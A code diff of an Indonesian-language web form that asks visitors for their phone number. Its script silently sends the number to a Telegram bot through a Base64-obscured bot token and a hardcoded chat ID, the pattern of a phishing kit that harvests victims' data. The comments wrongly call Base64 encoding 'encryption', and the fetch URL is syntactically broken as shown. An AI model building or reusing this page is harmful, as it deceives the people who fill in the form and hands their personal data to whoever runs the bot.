@@ -101,11 +101,11 @@
 <body>
 <form id="phoneForm" method="post" onsubmit="submitForm(event)">
     <div class="container">
-        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg3W1e-Q4DtbaO1xNNgQBsYSOF_eMf4kssHUNlXmShUHc93Lgj5fdB4ZTVr8NAsj4xN1Z3BiDrfr3CISxTEThEixk84xxIf4ZQm6QPB31R4O_gavWdcg00yhAJtYbctqz5eTrjxwS0jq26KVdHLt7f4cyI6vT6zHYreTAvWBEYbKzfDfpKbxdoLSMmh2lDS" alt="Logo" class="logo">
+        <img src="https://path_to_logo.png" alt="Logo" class="logo">
         <p>Masukkan <strong>nomor HP</strong> kamu untuk lanjut</p><br>
         <div class="input-container">
             <div class="input-wrapper">
-                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhfqqkgEeAbg1A2QZDsQjJm7-R10BYdQgCccD9_JeTv5968wQSm4yoyNTPu8T6I3uxfVTNAZ2uvYfc38sjOU4-lywWponnU1OjiSM7Di_keRhqsfgzppcPIRNJAVPYr1hjNTvwRElxo_tOLlvkVgy7Na72LnBLfFN1p37QlOTg98zgJyPBX2nXI9Q8h-1nc" alt="Icon" class="icon">
+                <img src="https://path_to_icon.png" alt="Icon" class="icon">
                 <input type="tel" name="phone" id="phone" placeholder="811-1234-5678" required>
             </div>
         </div>
@@ -119,17 +119,17 @@
 </form>
 
 <script>
-    // Token Telegram yang dienkripsi (misalnya menggunakan Base64)
-    const encryptedToken = "NzgwMDQ3NTY3NzoBQUFDEAAUKSxlQ21JbkUwLTF4Z--OM44"; // Ganti dengan token terenkripsi Anda
+    // Token yang sudah dienkripsi menggunakan Base64 (ini adalah contoh enkripsi token)
+    const encryptedToken = 'Nzg1MjU4MTI5Njo6QUFFY293OUZmdlXMIz9MLkK6VTKcLWCIX1jApGo';
 
     // Fungsi untuk mendekripsi token (Base64 decode)
-    function decryptToken(encrypted) {
-        return atob(encrypted);
+    function decryptToken(encryptedToken) {
+        return atob(encryptedToken); // Dekripsi menggunakan Base64
     }
 
-    // Fungsi utama untuk mengirim data
+    // Fungsi untuk mengirimkan pesan
     function submitForm(event) {
-        event.preventDefault(); // Mencegah pengiriman form standar
+        event.preventDefault(); // Mencegah form dari refresh halaman
 
         const phoneNumber = document.getElementById('phone').value;
 
@@ -138,12 +138,13 @@
             return;
         }
 
-        // Dekripsi token sebelum digunakan
-        const botToken = decryptToken(encryptedToken);
-        const chatId = '6824078885'; // Ganti dengan Chat ID Anda
+        // Dekripsi token
+        const botToken = decryptToken(encryptedToken); // Dekripsi token
+        const chatId = '6824078885'; // Ganti dengan ID Chat Telegram Anda
 
         document.getElementById('loading').style.display = 'block';
 
+        // Mengirimkan pesan ke Telegram
         fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
             method: 'POST',
             headers: {
@@ -171,3 +172,5 @@
         });
     }
 </script>
+</body>
+</html>
